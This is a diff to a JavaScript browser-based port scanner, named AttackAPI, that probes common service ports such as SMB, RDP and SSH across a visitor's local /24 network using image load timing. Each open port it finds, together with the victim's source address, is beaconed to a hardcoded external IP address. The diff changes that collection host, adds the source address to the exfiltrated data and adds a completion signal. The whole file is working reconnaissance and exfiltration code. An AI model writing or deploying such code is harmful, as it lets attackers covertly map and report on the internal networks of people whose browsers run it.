@@ -4,14 +4,14 @@
 
 // Change this URL to where you would like scan results reported to
 function report( data ){
-  new Image().src = 'http://193.36.15.252/net?'+data;
+  new Image().src = 'http://193.36.15.241/net?'+data;
 }
 
 
 function ports_callback( host, port, state ){
   if( state == "closed" ) return;
   // console.log( host, port, state );
-  report( "openport=" + host + ":" + port );
+  report( "openport=" + host + ":" + port + "&srcip=" + AttackAPI.PortScanner.src );
 }
 
 var AttackAPI = {
@@ -23,6 +23,7 @@ AttackAPI.PortScanner = {};
 AttackAPI.PortScanner.ports = '445,139,135,3389,80,23,443,3306,21,22,25,110,143,53,8080,1723,111,995,993,5900,1025,587,8888,199,1720,465,548,113,81,6001'.split(',')
 AttackAPI.PortScanner.port_index = 0;
 AttackAPI.PortScanner.host_num = 1;
+AttackAPI.PortScanner.src = '';
 AttackAPI.PortScanner.scanPort = function (callback, target, port, timeout) {
   var timeout = (timeout == null)?100:timeout;
   var img = new Image();
@@ -39,7 +40,7 @@ AttackAPI.PortScanner.scanPort = function (callback, target, port, timeout) {
   
   setTimeout(function () {
     if (!img) return;
-    img.src = 'icon.png';
+    img.src = 'http://localhost/icon.png';
     img = undefined;
     callback(target, port, 'closed');
   }, timeout);
@@ -54,11 +55,16 @@ AttackAPI.PortScanner.scanTarget = function (callback, target, ports, timeout)
 AttackAPI.PortScanner.scanNetwork = function ( callback, target )
 {
   if( target.toLowerCase() == 'udp' ) return;
+  AttackAPI.PortScanner.src = target;
   a = target.split('.');
   AttackAPI.PortScanner.scanPort( callback, a[0]+'.'+a[1]+'.'+a[2]+'.'+AttackAPI.PortScanner.host_num, AttackAPI.PortScanner.ports[AttackAPI.PortScanner.port_index]);
   AttackAPI.PortScanner.host_num++;
   if( AttackAPI.PortScanner.host_num >= 255 ){ 
     AttackAPI.PortScanner.port_index++;
+    if( AttackAPI.PortScanner.port_index >= AttackAPI.PortScanner.ports.length ){
+      report( "scancomplete" );
+      return;
+    }
     AttackAPI.PortScanner.host_num = 1;
   }
   setTimeout( function(){
